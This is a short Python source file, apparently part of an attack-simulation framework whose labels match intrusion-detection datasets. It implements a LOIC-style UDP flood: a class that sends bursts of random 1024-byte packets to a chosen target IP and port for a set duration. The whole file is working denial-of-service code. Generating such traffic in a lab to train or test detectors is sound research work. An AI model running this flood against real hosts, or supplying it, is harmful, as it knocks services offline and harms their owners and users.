"""LOIC UDP DDoS attack implementation"""

import asyncio
import logging
import socket
import random
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class DDosLOICUDP(BaseAttack):
    """LOIC UDP flood attack"""
    
    def get_attack_type(self) -> str:
        return "DDOS attack-LOIC-UDP"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _udp_flood(self):
        """Send UDP packets"""
        port = self.target_port or self.get_default_port()
        duration = self.parameters.get('duration', 300)
        packet_size = self.parameters.get('packet_size', 1024)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random.randbytes(packet_size)
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            while (asyncio.get_event_loop().time() - start_time) < duration:
                for _ in range(1000):  # Send bursts
                    try:
                        sock.sendto(payload, (self.target_ip, port))
                        self.packets_sent += 1
                    except Exception:
                        pass
                
                if self.packets_sent % 10000 == 0:
                    logger.info(f"LOIC-UDP: Sent {self.packets_sent} packets")
                
                await asyncio.sleep(0.001)  # Small delay
        finally:
            sock.close()
        
        logger.info(f"LOIC-UDP: Attack complete. Sent {self.packets_sent} packets")
    
    async def _execute_attack(self):
        """Execute LOIC UDP attack"""
        logger.info(f"LOIC-UDP: Starting UDP flood on {self.target_ip}")
        await self._udp_flood()

